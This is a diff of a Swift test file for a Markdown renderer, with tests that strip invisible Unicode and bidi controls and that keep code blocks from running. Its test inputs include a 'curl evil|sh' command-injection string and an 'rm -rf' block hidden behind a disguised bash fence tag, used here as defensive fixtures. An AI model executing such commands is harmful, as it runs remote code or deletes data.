@@ -21,18 +21,42 @@ struct MarkdownPieceFlattenTests {
         #expect(code == "true;curl evil|sh; # echo ok")
     }
 
-    @Test("Direction controls leave prose, cells and link labels, and joiners stay")
-    func inlineLosesDirectionControls() {
-        let flat = pieces("a\u{202E}b [c\u{202E}d](https://example.com) **e\u{2066}f** g\u{200D}h\n\n| x\u{202E}y |\n| --- |\n| 1 |")
+    @Test(
+        "Every invisible control leaves the text, and what is part of it stays",
+        arguments: [
+            0x202A, 0x202B, 0x202C, 0x202D, 0x202E, 0x2066, 0x2067, 0x2068, 0x2069,
+            0x200B, 0x08, 0x1B, 0x7F, 0x9B, 0xE0041,
+        ]
+    )
+    func controlLeaves(_ value: UInt32) {
+        let control = String(Unicode.Scalar(value)!)
+        #expect(MarkdownInvisibleControls.stripped("a\(control)b\u{200D}c\td\ne") == "ab\u{200D}c\td\ne")
+    }
+
+    @Test("Prose, cells, code spans and link labels all lose them, and a link keeps its address")
+    func inlineLosesControls() {
+        let flat = pieces("a\u{202E}b [c\u{202E}d](https://example.com) **e\u{2066}f** *g\u{2066}h* ~~i\u{2066}j~~ `k\u{2066}l`\n\n| x\u{202E}y |\n| --- |\n| 1 |")
         #expect(flat[0].body == .text([
             .text("ab "), .link(text: [.text("cd")], url: "https://example.com"), .text(" "),
-            .strong([.text("ef")]), .text(" g\u{200D}h"),
+            .strong([.text("ef")]), .text(" "), .emphasis([.text("gh")]), .text(" "),
+            .strikethrough([.text("ij")]), .text(" "), .code("kl"),
         ], heading: nil))
         guard case let .cell(cell) = flat[1].body else {
             Issue.record("the piece is not a cell")
             return
         }
         #expect(cell.inline == [.text("xy")])
+    }
+
+    @Test("A fence tag hidden behind a control still does not run")
+    func hiddenFenceTagStaysUnrunnable() {
+        let flat = pieces("```ba\u{202E}sh\nrm -rf x\n```")
+        guard case let .code(code, language, info) = flat[0].body else {
+            Issue.record("the piece is not code")
+            return
+        }
+        #expect(language == .plainText)
+        #expect(CodeBlockCommand.runnable(code: code, info: info) == nil)
     }
 
     @Test("What follows a quote is outside it")
@@ -95,9 +119,13 @@ struct MarkdownPieceFlattenTests {
         }
         #expect(cells.map(\.alignment).prefix(3) == [.leading, .center, .trailing])
         #expect(cells.allSatisfy { $0.columns == 3 && $0.rows == 3 })
+        #expect(cells.map(\.row) == [0, 0, 0, 1, 1, 1, 2, 2, 2])
+        #expect(cells.map(\.column) == [0, 1, 2, 0, 1, 2, 0, 1, 2])
+        #expect(cells[8].alignment == .trailing)
+        #expect(cells[4].inline == [.text("2")])
     }
 
-    @Test("A heading in a quote after prose gets the heading gap, and a first heading none")
+    @Test("A heading opening a quote keeps the block gap, a later one gets the heading gap, and a first one none")
     func headingGapInQuote() {
         let flat = pieces("Prose\n\n> # T\n\n# Two")
         #expect(flat[1].gap == .block)
